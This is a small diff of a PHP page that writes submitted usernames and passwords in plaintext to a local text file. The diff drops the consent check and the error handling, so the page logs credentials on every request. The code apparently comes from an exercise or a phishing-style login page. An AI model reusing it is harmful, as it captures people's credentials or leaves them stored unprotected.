@@ -1,14 +1,12 @@
 <?php
-if(isset($_POST['agree'])){
     $Name = "username:".$_POST['username']."
     ";
     $Pass = "password:".$_POST['password']."
     ";
-    $file=fopen("Zadanie_Ulozene.txt", "w") or die("Unable to open file!");
+    $file=fopen("Zadanie_Ulozene.txt", "w");
     fwrite($file, $Name);
     fwrite($file, $Pass);
     fclose($file);
-}
 ?>
 
 <!DOCTYPE html>
